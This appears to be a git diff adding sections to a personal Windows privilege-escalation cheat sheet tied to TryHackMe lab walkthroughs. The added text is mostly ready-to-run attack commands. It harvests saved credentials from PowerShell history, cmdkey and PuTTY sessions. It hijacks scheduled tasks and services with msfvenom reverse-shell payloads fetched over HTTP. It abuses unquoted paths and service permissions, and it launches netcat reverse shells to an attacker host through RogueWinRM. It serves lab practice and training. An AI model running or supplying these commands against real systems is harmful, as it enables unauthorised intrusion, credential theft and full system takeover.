@@ -42,8 +42,10 @@ wmic service get name,startname
 wmic service get name,pathname,startname | findstr "Program Files"
 ```
 
+Find text in file
+
 ```
-cacls *.exe
+type C:\Windows\path\to\file\$FILE | findstr $STRING
 ```
 
 ### **Whoami /priv**
@@ -56,13 +58,48 @@ cacls *.exe
 
 ###
 
-### **Recent Files**
+## Harvesting Passwords from Usual Spots
 
 Might be able to find interesting files by looking at what was recently accessed. Start -> run -> recent.
 
 <figure><img src="../../.gitbook/assets/image (3) (5).png" alt=""><figcaption></figcaption></figure>
 
+### **Powershell history**
 
+**Examples**
+
+[#harvesting-passwords-from-usual-spots](../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")
+
+**Victim(cmd)**
+
+```
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+**Examples**
+
+[#harvesting-passwords-from-usual-spots](../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")
+
+Need GUI to see other command prompt that will be spawned
+
+**Victim(cmd)**
+
+```
+cmdkey /list
+runas /savecred /user:$DOMAIN\$USERNAME cmd.exe
+```
+
+**Examples**
+
+[#harvesting-passwords-from-usual-spots](../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")
+
+Retrieve the saved password stored in the saved PuTTY session under your profile.&#x20;
+
+**Victim(cmd)**
+
+```
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
 
 ## Add User
 
@@ -82,7 +119,245 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```
 
+## Scheduled Tasks
 
+**Examples**
+
+[windows-privilege-escalation.md](../../walkthroughs/tryhackme/windows-privilege-escalation.md "mention")
+
+Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
+
+Scheduled tasks can be listed from the command line using the schtasks command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
+
+**Victim(cmd)**
+
+```
+schtasks 
+```
+
+**Victim(cmd)**
+
+```
+schtasks /query /tn $TASK /fo list /v
+```
+
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Victim(cmd)**
+
+```
+icacls c:\tasks\schtask.bat
+```
+
+<figure><img src="../../.gitbook/assets/image (20) (5) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+nc -lvnp 4444
+```
+
+**Victim**
+
+```
+echo c:\tools\nc64.exe -e cmd.exe $KALI 4444 > C:\tasks\schtask.bat
+schtasks /run /tn $TASK 
+```
+
+
+
+## Abusing Service Misconfigurations
+
+**Examples**
+
+[#abusing-service-misconfigurations](../../walkthroughs/tryhackme/windows-privilege-escalation.md#abusing-service-misconfigurations "mention")
+
+### Insecure Permissions on Service Executable
+
+**Get the flag on svcusr1's desktop**
+
+**Victim(cmd)**
+
+```
+sc qc WindowsScheduler
+```
+
+<figure><img src="../../.gitbook/assets/image (21) (5) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(cmd)**
+
+```
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+```
+
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4445 -f exe-service -o rev-svc.exe
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim(Powershell)**
+
+```
+wget http://$KALI:81/rev-svc.exe -O rev-svc.exe
+```
+
+Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well.
+
+**Victim(Powershell)**
+
+```
+cd C:\PROGRA~2\SYSTEM~1\
+move WService.exe WService.exe.bkp
+move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+icacls WService.exe /grant Everyone:F
+```
+
+**Kali**
+
+```
+nc -lvp 4445
+```
+
+**Note:** PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.
+
+As a result, you'll get a reverse shell with svcusr1 privileges:
+
+**Victim(cmd)**
+
+```
+sc stop windowsscheduler
+sc start windowsscheduler
+```
+
+**OR**
+
+**Victim(Powershell)**
+
+```
+sc.exe stop windowsscheduler
+sc.exe start windowsscheduler
+```
+
+<figure><img src="../../.gitbook/assets/image (31) (2).png" alt=""><figcaption></figcaption></figure>
+
+### Unquoted Service Paths
+
+**Examples**
+
+[#unquoted-service-paths](../../walkthroughs/tryhackme/windows-privilege-escalation.md#unquoted-service-paths "mention")
+
+**Victim(cmd)**
+
+```
+ sc qc "disk sorter enterprise"
+```
+
+<figure><img src="../../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4446 -f exe-service -o rev-svc2.exe
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim(Powershell)**
+
+```
+wget http://10.10.15.215:81/rev-svc2.exe -O rev-svc2.exe
+move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+```
+
+**Kali**
+
+```
+nc -lvp 4446
+```
+
+**Victim(cmd)**
+
+```
+sc.exe stop "disk sorter enterprise"
+sc.exe start "disk sorter enterprise"
+```
+
+<figure><img src="../../.gitbook/assets/image (3) (1) (4).png" alt=""><figcaption></figcaption></figure>
+
+### Insecure Service Permissions
+
+**Examples**
+
+[#insecure-service-permissions](../../walkthroughs/tryhackme/windows-privilege-escalation.md#insecure-service-permissions "mention")
+
+**Victim(cmd)**
+
+```
+cd C:\tools\AccessChk
+accesschk64.exe -qlc thmservice
+```
+
+<figure><img src="../../.gitbook/assets/image (7) (8) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4447 -f exe-service -o rev-svc3.exe
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim(Powershell)**
+
+```
+wget http://10.10.15.215:81/rev-svc3.exe -O rev-svc3.exe
+```
+
+**Kali**
+
+```
+nc -lvp 4447
+```
+
+**Victim(Powershell)**
+
+```
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+sc.exe stop THMService
+sc.exe start THMService
+```
+
+<figure><img src="../../.gitbook/assets/image (16) (3).png" alt=""><figcaption></figcaption></figure>
+
+## Abusing dangerous privileges
+
+**Examples**
+
+[#abusing-dangerous-privileges](../../walkthroughs/tryhackme/windows-privilege-escalation.md#abusing-dangerous-privileges "mention")
+
+<figure><img src="../../.gitbook/assets/image (32) (3).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+nc -lvp 4442
+```
+
+**Victim(Browser)**
+
+```
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.22.165 4442"
+```
+
+<figure><img src="../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
+
+##
 
 ## Privilege Escalation
 
